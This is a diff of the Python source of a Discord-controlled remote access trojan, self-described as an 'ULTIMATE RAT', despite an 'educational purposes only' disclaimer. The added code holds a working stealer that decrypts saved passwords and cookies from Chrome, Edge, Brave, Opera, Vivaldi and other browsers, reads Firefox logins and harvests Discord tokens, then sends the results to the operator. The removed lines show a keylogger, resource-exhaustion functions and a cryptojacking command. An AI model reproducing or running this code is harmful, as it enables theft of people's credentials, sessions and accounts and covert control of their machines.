@@ -1,4 +1,4 @@
-# mytemplate.py - ULTIMATE RAT with EVERYTHING
+# mytemplate.py - ULTIMATE RAT with WORKING Password Stealer
 # ⚠️ DISCLAIMER: For educational purposes only!
 # Made by Neek :3
 
@@ -162,8 +162,6 @@ STREAMING = False
 STREAM_TASK = None
 KEYLOGGING = False
 KEYLOG_DATA = []
-MINING = False
-MINING_THREAD = None
 email_monitor_running = False
 
 # ========== STARTUP FUNCTION ==========
@@ -410,6 +408,8 @@ def get_default_browser():
                 ('brave', r'C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe'),
                 ('opera', r'C:\Program Files\Opera\opera.exe'),
                 ('opera', r'C:\Program Files (x86)\Opera\opera.exe'),
+                ('vivaldi', r'C:\Program Files\Vivaldi\Application\vivaldi.exe'),
+                ('vivaldi', r'C:\Program Files (x86)\Vivaldi\Application\vivaldi.exe'),
             ]
             
             for name, path in browsers:
@@ -431,6 +431,386 @@ def get_default_browser():
     except:
         return 'unknown', 'start'
 
+# ========== BROWSER DETECTION ==========
+def get_installed_browsers():
+    """Detect all installed browsers on the system"""
+    browsers = []
+    
+    # Common browser paths
+    browser_paths = [
+        ('Chrome', os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default')),
+        ('Chrome', os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Profile *')),
+        ('Chrome', os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Guest Profile')),
+        ('Edge', os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default')),
+        ('Edge', os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Profile *')),
+        ('Brave', os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default')),
+        ('Brave', os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Profile *')),
+        ('Firefox', os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*.default')),
+        ('Firefox', os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*.default-release')),
+        ('Opera', os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable')),
+        ('Opera', os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable')),
+        ('Vivaldi', os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default')),
+        ('Chromium', os.path.expandvars(r'%LOCALAPPDATA%\Chromium\User Data\Default')),
+        ('Arc', os.path.expandvars(r'%LOCALAPPDATA%\Arc\User Data\Default')),
+    ]
+    
+    for name, path_pattern in browser_paths:
+        # Check if path exists
+        if '*' in path_pattern:
+            # Handle wildcard
+            import glob
+            matches = glob.glob(path_pattern)
+            if matches:
+                browsers.append(name)
+        elif os.path.exists(path_pattern):
+            browsers.append(name)
+    
+    # Remove duplicates
+    browsers = list(set(browsers))
+    return browsers
+
+# ========== PASSWORD STEALER (FIXED) ==========
+
+def get_chrome_key(browser_path):
+    """Get browser encryption key"""
+    try:
+        local_state_path = os.path.join(os.path.dirname(os.path.dirname(browser_path)), 'Local State')
+        if not os.path.exists(local_state_path):
+            # Try alternative path
+            if 'Edge' in browser_path or 'Brave' in browser_path or 'Vivaldi' in browser_path:
+                local_state_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(browser_path))), 'Local State')
+        
+        if not os.path.exists(local_state_path):
+            return None
+            
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+            
+        if "os_crypt" not in local_state:
+            return None
+            
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+        
+        # Decrypt using Windows DPAPI
+        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return key
+    except:
+        return None
+
+def decrypt_password(encrypted_password, key):
+    """Decrypt password using AES-GCM"""
+    try:
+        if not encrypted_password or not key:
+            return None
+            
+        # Handle different formats
+        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+            encrypted_password = encrypted_password[3:]
+            nonce = encrypted_password[3:15]
+            ciphertext = encrypted_password[15:-16]
+            tag = encrypted_password[-16:]
+            
+            from Crypto.Cipher import AES
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted.decode('utf-8')
+    except:
+        try:
+            # Fallback to DPAPI
+            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
+        except:
+            return None
+    return None
+
+def get_browser_passwords_chromium(browser_name, browser_path):
+    """Get passwords from Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi)"""
+    passwords = []
+    try:
+        # Determine the login data path
+        login_data_path = os.path.join(browser_path, 'Login Data')
+        
+        # For some browsers, the path might be different
+        if not os.path.exists(login_data_path):
+            # Try alternative paths
+            possible_paths = [
+                os.path.join(browser_path, 'Login Data'),
+                os.path.join(browser_path, 'Login Data for Account'),
+            ]
+            for path in possible_paths:
+                if os.path.exists(path):
+                    login_data_path = path
+                    break
+        
+        if not os.path.exists(login_data_path):
+            return passwords
+        
+        # Get the encryption key
+        key = get_chrome_key(login_data_path)
+        if not key:
+            return passwords
+        
+        # Copy database to temp
+        temp_path = os.path.join(os.environ['TEMP'], f'{browser_name}_login.db')
+        shutil.copy2(login_data_path, temp_path)
+        
+        # Connect to database
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+        
+        # Query logins
+        try:
+            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+        except:
+            # Some browsers might have different table structure
+            cursor.execute('SELECT url, username, password FROM logins')
+        
+        rows = cursor.fetchall()
+        for row in rows:
+            try:
+                if len(row) >= 3:
+                    url = row[0] or ''
+                    username = row[1] or ''
+                    encrypted_password = row[2]
+                    
+                    if encrypted_password:
+                        password = decrypt_password(encrypted_password, key)
+                        if password:
+                            passwords.append({
+                                'browser': browser_name,
+                                'url': url,
+                                'username': username,
+                                'password': password
+                            })
+            except:
+                pass
+        
+        cursor.close()
+        conn.close()
+        os.remove(temp_path)
+        
+    except Exception as e:
+        pass
+    
+    return passwords
+
+def get_firefox_passwords(profile_path):
+    """Get passwords from Firefox"""
+    passwords = []
+    try:
+        logins_path = os.path.join(profile_path, 'logins.json')
+        if not os.path.exists(logins_path):
+            return passwords
+        
+        with open(logins_path, 'r', encoding='utf-8') as f:
+            data = json.loads(f.read())
+        
+        if 'logins' in data:
+            for login in data['logins']:
+                try:
+                    passwords.append({
+                        'browser': 'Firefox',
+                        'url': login.get('hostname', ''),
+                        'username': login.get('usernameField', ''),
+                        'password': login.get('passwordField', '')
+                    })
+                except:
+                    pass
+    except:
+        pass
+    
+    return passwords
+
+def get_all_passwords():
+    """Get passwords from all browsers"""
+    all_passwords = []
+    
+    # Chromium-based browsers
+    chromium_browsers = {
+        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
+        'Chrome_Profile': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
+        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default'),
+        'Edge_Profile': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
+        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default'),
+        'Brave_Profile': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
+        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
+        'Opera_GX': os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable'),
+        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default'),
+        'Vivaldi_Profile': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data'),
+        'Chromium': os.path.expandvars(r'%LOCALAPPDATA%\Chromium\User Data\Default'),
+        'Arc': os.path.expandvars(r'%LOCALAPPDATA%\Arc\User Data\Default'),
+    }
+    
+    # Check each Chromium browser
+    for browser_name, browser_path in chromium_browsers.items():
+        if os.path.exists(browser_path):
+            try:
+                # Try Default profile first
+                passwords = get_browser_passwords_chromium(browser_name, browser_path)
+                all_passwords.extend(passwords)
+            except:
+                pass
+    
+    # Firefox
+    firefox_profiles = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
+    if os.path.exists(firefox_profiles):
+        for profile in os.listdir(firefox_profiles):
+            if 'default' in profile.lower():
+                profile_path = os.path.join(firefox_profiles, profile)
+                try:
+                    passwords = get_firefox_passwords(profile_path)
+                    all_passwords.extend(passwords)
+                except:
+                    pass
+    
+    # Also check Firefox in AppData\Local
+    firefox_local = os.path.expandvars(r'%LOCALAPPDATA%\Mozilla\Firefox\Profiles')
+    if os.path.exists(firefox_local):
+        for profile in os.listdir(firefox_local):
+            if 'default' in profile.lower():
+                profile_path = os.path.join(firefox_local, profile)
+                try:
+                    passwords = get_firefox_passwords(profile_path)
+                    all_passwords.extend(passwords)
+                except:
+                    pass
+    
+    return all_passwords
+
+def get_browser_cookies_chromium(browser_name, browser_path):
+    """Get cookies from Chromium-based browsers"""
+    cookies = []
+    try:
+        cookie_path = os.path.join(browser_path, 'Cookies')
+        if not os.path.exists(cookie_path):
+            return cookies
+        
+        key = get_chrome_key(cookie_path)
+        if not key:
+            return cookies
+        
+        temp_path = os.path.join(os.environ['TEMP'], f'{browser_name}_cookies.db')
+        shutil.copy2(cookie_path, temp_path)
+        
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+        cursor.execute('SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 100')
+        
+        for row in cursor.fetchall():
+            try:
+                host = row[0] or ''
+                name = row[1] or ''
+                encrypted_value = row[2]
+                path = row[3] or ''
+                
+                if encrypted_value:
+                    decrypted = decrypt_password(encrypted_value, key)
+                    if decrypted:
+                        cookies.append({
+                            'browser': browser_name,
+                            'host': host,
+                            'name': name,
+                            'value': decrypted,
+                            'path': path
+                        })
+            except:
+                pass
+        
+        cursor.close()
+        conn.close()
+        os.remove(temp_path)
+        
+    except:
+        pass
+    
+    return cookies
+
+def get_all_cookies():
+    """Get cookies from all browsers"""
+    all_cookies = []
+    
+    chromium_browsers = {
+        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
+        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default'),
+        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default'),
+        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
+        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default'),
+        'Chromium': os.path.expandvars(r'%LOCALAPPDATA%\Chromium\User Data\Default'),
+    }
+    
+    for browser_name, browser_path in chromium_browsers.items():
+        if os.path.exists(browser_path):
+            try:
+                cookies = get_browser_cookies_chromium(browser_name, browser_path)
+                all_cookies.extend(cookies)
+            except:
+                pass
+    
+    return all_cookies
+
+# ========== TOKEN STEALER ==========
+def get_discord_tokens():
+    """Get Discord tokens from all possible locations"""
+    tokens = []
+    token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
+    
+    # Discord app paths
+    discord_paths = [
+        os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
+        os.path.expandvars(r'%APPDATA%\DiscordCanary\Local Storage\leveldb'),
+        os.path.expandvars(r'%APPDATA%\DiscordPTB\Local Storage\leveldb'),
+        os.path.expandvars(r'%APPDATA%\Lightcord\Local Storage\leveldb'),
+    ]
+    
+    # Check Discord app storage
+    for path in discord_paths:
+        if os.path.exists(path):
+            try:
+                for file in os.listdir(path):
+                    if file.endswith('.log') or file.endswith('.ldb'):
+                        file_path = os.path.join(path, file)
+                        try:
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                matches = re.findall(token_pattern, content)
+                                for match in matches:
+                                    if match not in tokens:
+                                        tokens.append(match)
+                        except:
+                            pass
+            except:
+                pass
+    
+    # Check browsers for Discord tokens
+    chromium_browsers = {
+        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
+        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
+        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
+        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Local Storage\leveldb'),
+        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default\Local Storage\leveldb'),
+    }
+    
+    for browser_name, path in chromium_browsers.items():
+        if os.path.exists(path):
+            try:
+                for file in os.listdir(path):
+                    if file.endswith('.log') or file.endswith('.ldb'):
+                        file_path = os.path.join(path, file)
+                        try:
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                matches = re.findall(token_pattern, content)
+                                for match in matches:
+                                    if match not in tokens:
+                                        tokens.append(match)
+                        except:
+                            pass
+            except:
+                pass
+    
+    return tokens
+
+# ========== HELPER FUNCTIONS ==========
 def get_installed_apps():
     apps = []
     try:
@@ -504,297 +884,6 @@ def clear_temp_files():
                         except:
                             pass
         return deleted
-    except:
-        return 0
-
-# ========== PASSWORD STEALER ==========
-def get_chrome_key():
-    try:
-        local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
-        if not os.path.exists(local_state_path):
-            return None
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.loads(f.read())
-        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        encrypted_key = encrypted_key[5:]
-        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        return key
-    except:
-        return None
-
-def decrypt_chrome_password(encrypted_password, key):
-    try:
-        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
-            encrypted_password = encrypted_password[3:]
-            nonce = encrypted_password[3:15]
-            ciphertext = encrypted_password[15:-16]
-            tag = encrypted_password[-16:]
-            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            return decrypted.decode('utf-8')
-    except:
-        try:
-            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
-        except:
-            return None
-    return None
-
-def get_chrome_passwords():
-    passwords = []
-    try:
-        chrome_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
-        if not os.path.exists(chrome_path):
-            return passwords
-        temp_path = os.path.join(os.environ['TEMP'], 'chrome_login.db')
-        shutil.copy2(chrome_path, temp_path)
-        key = get_chrome_key()
-        if not key:
-            return passwords
-        conn = sqlite3.connect(temp_path)
-        cursor = conn.cursor()
-        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-        for row in cursor.fetchall():
-            url = row[0]
-            username = row[1] or ''
-            encrypted_password = row[2]
-            password = decrypt_chrome_password(encrypted_password, key)
-            if password:
-                passwords.append({'url': url, 'username': username, 'password': password})
-        cursor.close()
-        conn.close()
-        os.remove(temp_path)
-        return passwords
-    except:
-        return passwords
-
-def get_edge_passwords():
-    passwords = []
-    try:
-        edge_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
-        if not os.path.exists(edge_path):
-            return passwords
-        temp_path = os.path.join(os.environ['TEMP'], 'edge_login.db')
-        shutil.copy2(edge_path, temp_path)
-        local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
-        if os.path.exists(local_state_path):
-            with open(local_state_path, 'r', encoding='utf-8') as f:
-                local_state = json.loads(f.read())
-            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            encrypted_key = encrypted_key[5:]
-            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-            conn = sqlite3.connect(temp_path)
-            cursor = conn.cursor()
-            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1] or ''
-                encrypted_password = row[2]
-                password = decrypt_chrome_password(encrypted_password, key)
-                if password:
-                    passwords.append({'url': url, 'username': username, 'password': password})
-            cursor.close()
-            conn.close()
-            os.remove(temp_path)
-        return passwords
-    except:
-        return passwords
-
-def get_firefox_passwords():
-    passwords = []
-    try:
-        firefox_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
-        if not os.path.exists(firefox_path):
-            return passwords
-        for profile in os.listdir(firefox_path):
-            if 'default' in profile.lower():
-                logins_path = os.path.join(firefox_path, profile, 'logins.json')
-                if os.path.exists(logins_path):
-                    with open(logins_path, 'r', encoding='utf-8') as f:
-                        data = json.load(f)
-                        if 'logins' in data:
-                            for login in data['logins']:
-                                passwords.append({
-                                    'url': login.get('hostname', 'Unknown'),
-                                    'username': login.get('usernameField', 'Unknown'),
-                                    'password': login.get('passwordField', 'Unknown')
-                                })
-        return passwords
-    except:
-        return passwords
-
-def get_all_passwords():
-    all_passwords = []
-    chrome_pass = get_chrome_passwords()
-    if chrome_pass:
-        all_passwords.extend(chrome_pass)
-    edge_pass = get_edge_passwords()
-    if edge_pass:
-        all_passwords.extend(edge_pass)
-    firefox_pass = get_firefox_passwords()
-    if firefox_pass:
-        all_passwords.extend(firefox_pass)
-    return all_passwords
-
-def get_chrome_cookies():
-    cookies = []
-    try:
-        chrome_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies')
-        if not os.path.exists(chrome_path):
-            return cookies
-        temp_path = os.path.join(os.environ['TEMP'], 'chrome_cookies.db')
-        shutil.copy2(chrome_path, temp_path)
-        key = get_chrome_key()
-        if not key:
-            return cookies
-        conn = sqlite3.connect(temp_path)
-        cursor = conn.cursor()
-        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
-        for row in cursor.fetchall():
-            host = row[0]
-            name = row[1]
-            encrypted_value = row[2]
-            decrypted = decrypt_chrome_password(encrypted_value, key)
-            if decrypted:
-                cookies.append({'host': host, 'name': name, 'value': decrypted})
-        cursor.close()
-        conn.close()
-        os.remove(temp_path)
-        return cookies
-    except:
-        return cookies
-
-# ========== KEYLOGGER ==========
-def start_keylogger():
-    global KEYLOGGING, KEYLOG_DATA
-    KEYLOGGING = True
-    KEYLOG_DATA = []
-    
-    def keylogger_thread():
-        try:
-            from pynput import keyboard
-            
-            def on_press(key):
-                global KEYLOG_DATA
-                if KEYLOGGING:
-                    try:
-                        if hasattr(key, 'char') and key.char:
-                            KEYLOG_DATA.append(key.char)
-                        else:
-                            if key == keyboard.Key.space:
-                                KEYLOG_DATA.append(' ')
-                            elif key == keyboard.Key.enter:
-                                KEYLOG_DATA.append('\n')
-                            elif key == keyboard.Key.backspace:
-                                if KEYLOG_DATA:
-                                    KEYLOG_DATA.pop()
-                            elif key == keyboard.Key.tab:
-                                KEYLOG_DATA.append('\t')
-                            elif key == keyboard.Key.shift:
-                                KEYLOG_DATA.append('[SHIFT]')
-                            elif key == keyboard.Key.ctrl:
-                                KEYLOG_DATA.append('[CTRL]')
-                            elif key == keyboard.Key.alt:
-                                KEYLOG_DATA.append('[ALT]')
-                            elif key == keyboard.Key.esc:
-                                KEYLOG_DATA.append('[ESC]')
-                            elif key == keyboard.Key.up:
-                                KEYLOG_DATA.append('[UP]')
-                            elif key == keyboard.Key.down:
-                                KEYLOG_DATA.append('[DOWN]')
-                            elif key == keyboard.Key.left:
-                                KEYLOG_DATA.append('[LEFT]')
-                            elif key == keyboard.Key.right:
-                                KEYLOG_DATA.append('[RIGHT]')
-                            elif key == keyboard.Key.cmd:
-                                KEYLOG_DATA.append('[WIN]')
-                    except:
-                        pass
-            
-            def on_release(key):
-                return True
-            
-            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-                listener.join()
-        except:
-            pass
-    
-    thread = threading.Thread(target=keylogger_thread, daemon=True)
-    thread.start()
-    return True
-
-def stop_keylogger():
-    global KEYLOGGING, KEYLOG_DATA
-    KEYLOGGING = False
-    data = ''.join(KEYLOG_DATA)
-    KEYLOG_DATA = []
-    return data
-
-# ========== MINING FUNCTIONS ==========
-MINING = False
-MINING_THREAD = None
-MINING_HASHES = 0
-
-def mine_crypto():
-    global MINING, MINING_HASHES
-    MINING_HASHES = 0
-    while MINING:
-        try:
-            data = str(random.random()).encode()
-            hash_result = hashlib.sha256(data).hexdigest()
-            if hash_result.startswith('0000'):
-                MINING_HASHES += 1
-            time.sleep(0.001)
-        except:
-            pass
-
-def start_mining():
-    global MINING, MINING_THREAD
-    if not MINING:
-        MINING = True
-        MINING_THREAD = threading.Thread(target=mine_crypto, daemon=True)
-        MINING_THREAD.start()
-        return True
-    return False
-
-def stop_mining():
-    global MINING, MINING_HASHES
-    MINING = False
-    if MINING_THREAD:
-        MINING_THREAD.join(timeout=1)
-    hashes = MINING_HASHES
-    MINING_HASHES = 0
-    return hashes
-
-def cpu_burn():
-    def burn():
-        while True:
-            _ = [i ** 2 for i in range(10000)]
-    for _ in range(psutil.cpu_count()):
-        threading.Thread(target=burn, daemon=True).start()
-    return True
-
-def ram_burn():
-    try:
-        ram_list = []
-        memory = psutil.virtual_memory()
-        target = int(memory.total * 0.8)
-        while sum(len(r) for r in ram_list) < target:
-            ram_list.append(b' ' * 1024 * 1024 * 100)
-            time.sleep(0.1)
-        return len(ram_list)
-    except:
-        return 0
-
-def disk_burn():
-    try:
-        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
-        files_created = 0
-        for i in range(10):
-            filename = os.path.join(temp_dir, f'temp_burn_{i}.dat')
-            with open(filename, 'wb') as f:
-                f.write(b' ' * 1024 * 1024 * 50)
-                files_created += 1
-        return files_created
     except:
         return 0
 
@@ -1103,9 +1192,9 @@ async def cmd_help(ctx):
             "`startupapps` - List startup applications",
         ],
         "🔑 Stealers": [
-            "`passwords` - Grab saved passwords (sends to email)",
-            "`tokens` - Grab Discord tokens (sends to email)",
-            "`cookies` - Grab Chrome cookies",
+            "`passwords` - Grab saved passwords (ALL browsers)",
+            "`tokens` - Grab Discord tokens",
+            "`cookies` - Grab cookies (ALL browsers)",
             "`wifipass` - Get saved WiFi passwords",
         ],
         "⌨️ Keylogger": [
@@ -1115,13 +1204,6 @@ async def cmd_help(ctx):
         "📧 Email Forwarding": [
             "`forwardemails` - Start forwarding emails to Discord",
             "`stopforward` - Stop forwarding emails",
-        ],
-        "⛏️ Mining/Resources": [
-            "`mining` - Start crypto mining",
-            "`stopmine` - Stop mining",
-            "`cpuburn` - Max out CPU usage",
-            "`ramburn` - Use up RAM",
-            "`diskburns` - Create large temp files",
         ],
         "💀 Destructive": [
             "`lock` - Lock PC",
@@ -1370,18 +1452,24 @@ async def cmd_startupapps(ctx):
 @bot.command(name='passwords')
 @is_authorized()
 async def cmd_passwords(ctx):
+    """Grab saved passwords from ALL browsers"""
     try:
-        await send_embed(ctx, "🔑 Password Stealer", "Searching for saved passwords...", discord.Color.gold())
+        await send_embed(ctx, "🔑 Password Stealer", "Searching ALL browsers for saved passwords...", discord.Color.gold())
         
         all_passwords = get_all_passwords()
         
         if all_passwords:
+            # Group by browser
             output = "=== SAVED PASSWORDS ===\n\n"
+            current_browser = ""
             for p in all_passwords:
+                if p['browser'] != current_browser:
+                    current_browser = p['browser']
+                    output += f"\n--- {current_browser} ---\n"
                 output += f"URL: {p['url']}\n"
                 output += f"Username: {p['username']}\n"
                 output += f"Password: {p['password']}\n"
-                output += "-" * 40 + "\n\n"
+                output += "-" * 40 + "\n"
             
             filename = f"passwords_{int(time.time())}.txt"
             with open(filename, 'w', encoding='utf-8') as f:
@@ -1395,12 +1483,12 @@ async def cmd_passwords(ctx):
             
             embed = discord.Embed(
                 title="🔑 Passwords Found!",
-                description=f"Found **{len(all_passwords)}** saved passwords.\n✅ Data sent to email!",
+                description=f"Found **{len(all_passwords)}** saved passwords from **{len(set(p['browser'] for p in all_passwords))}** browsers.\n✅ Data sent to email!",
                 color=discord.Color.gold()
             )
             await ctx.send(embed=embed)
         else:
-            await send_embed(ctx, "🔑 Password Stealer", "No saved passwords found.", discord.Color.orange())
+            await send_embed(ctx, "🔑 Password Stealer", "No saved passwords found on this system.", discord.Color.orange())
             
     except Exception as e:
         await send_embed(ctx, "Password Error", str(e), discord.Color.red())
@@ -1408,39 +1496,15 @@ async def cmd_passwords(ctx):
 @bot.command(name='tokens')
 @is_authorized()
 async def cmd_tokens(ctx):
+    """Grab Discord tokens from ALL locations"""
     try:
         await send_embed(ctx, "🔑 Token Grabber", "Searching for Discord tokens...", discord.Color.gold())
         
-        found_tokens = []
-        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
-        paths = [
-            os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
-            os.path.expandvars(r'%APPDATA%\DiscordCanary\Local Storage\leveldb'),
-            os.path.expandvars(r'%APPDATA%\DiscordPTB\Local Storage\leveldb'),
-            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
-            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
-        ]
-        for path in paths:
-            if os.path.exists(path):
-                try:
-                    for file in os.listdir(path):
-                        if file.endswith('.log') or file.endswith('.ldb'):
-                            file_path = os.path.join(path, file)
-                            try:
-                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                    content = f.read()
-                                    matches = re.findall(token_pattern, content)
-                                    for match in matches:
-                                        if match not in found_tokens:
-                                            found_tokens.append(match)
-                            except:
-                                pass
-                except:
-                    pass
+        tokens = get_discord_tokens()
         
-        if found_tokens:
+        if tokens:
             output = "=== DISCORD TOKENS ===\n\n"
-            for token in found_tokens:
+            for token in tokens:
                 output += token + "\n"
             
             # Send to email
@@ -1448,7 +1512,7 @@ async def cmd_tokens(ctx):
             
             embed = discord.Embed(
                 title="🔑 Tokens Found!",
-                description=f"Found **{len(found_tokens)}** Discord tokens.\n✅ Data sent to email!",
+                description=f"Found **{len(tokens)}** Discord tokens.\n✅ Data sent to email!",
                 color=discord.Color.gold()
             )
             await ctx.send(embed=embed)
@@ -1461,18 +1525,23 @@ async def cmd_tokens(ctx):
 @bot.command(name='cookies')
 @is_authorized()
 async def cmd_cookies(ctx):
+    """Grab cookies from ALL browsers"""
     try:
-        await send_embed(ctx, "🍪 Cookie Stealer", "Searching for cookies...", discord.Color.blue())
+        await send_embed(ctx, "🍪 Cookie Stealer", "Searching ALL browsers for cookies...", discord.Color.blue())
         
-        cookies = get_chrome_cookies()
+        cookies = get_all_cookies()
         
         if cookies:
             output = "=== COOKIES FOUND ===\n\n"
-            for c in cookies[:50]:
+            current_browser = ""
+            for c in cookies:
+                if c['browser'] != current_browser:
+                    current_browser = c['browser']
+                    output += f"\n--- {current_browser} ---\n"
                 output += f"Host: {c['host']}\n"
                 output += f"Name: {c['name']}\n"
                 output += f"Value: {c['value']}\n"
-                output += "-" * 40 + "\n\n"
+                output += "-" * 40 + "\n"
             
             filename = f"cookies_{int(time.time())}.txt"
             with open(filename, 'w', encoding='utf-8') as f:
@@ -1483,7 +1552,7 @@ async def cmd_cookies(ctx):
             
             embed = discord.Embed(
                 title="🍪 Cookies Found!",
-                description=f"Found **{len(cookies)}** cookies from Chrome.",
+                description=f"Found **{len(cookies)}** cookies from browsers.",
                 color=discord.Color.blue()
             )
             await ctx.send(embed=embed)
@@ -1582,57 +1651,6 @@ async def cmd_stopforward(ctx):
     global email_monitor_running
     email_monitor_running = False
     await send_embed(ctx, "📧 Email Forwarding Stopped", "No longer forwarding emails.", discord.Color.red())
-
-# ========== MINING COMMANDS ==========
-
-@bot.command(name='mining')
-@is_authorized()
-async def cmd_mining(ctx):
-    try:
-        await send_embed(ctx, "⛏️ Mining Started", "Opening crypto miner in browser...", discord.Color.gold())
-        browser_name, browser_path = get_default_browser()
-        mining_urls = [
-            'https://cryptojacking.com/miner.html',
-            'https://coinhive.com/demo',
-        ]
-        url = random.choice(mining_urls)
-        if browser_name == 'unknown':
-            webbrowser.open(url)
-        else:
-            subprocess.Popen([browser_path, url], creationflags=0x08000000)
-        await send_embed(ctx, "⛏️ Mining Active", "Miner running in browser! Close tab to stop.", discord.Color.gold())
-    except Exception as e:
-        await send_embed(ctx, "Mining Error", str(e), discord.Color.red())
-
-@bot.command(name='cpuburn')
-@is_authorized()
-async def cmd_cpuburn(ctx):
-    try:
-        await send_embed(ctx, "🔥 CPU Burn", "Maxing out CPU...", discord.Color.red())
-        cpu_burn()
-        await send_embed(ctx, "🔥 CPU Burn Complete", f"CPU at 100% on all {psutil.cpu_count()} cores!", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='ramburn')
-@is_authorized()
-async def cmd_ramburn(ctx):
-    try:
-        await send_embed(ctx, "💾 RAM Burn", "Using up RAM...", discord.Color.red())
-        chunks = ram_burn()
-        await send_embed(ctx, "💾 RAM Burn Complete", f"Used **{chunks}** chunks of 100MB RAM!", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='diskburns')
-@is_authorized()
-async def cmd_diskburn(ctx):
-    try:
-        await send_embed(ctx, "💿 Disk Burn", "Creating large temp files...", discord.Color.red())
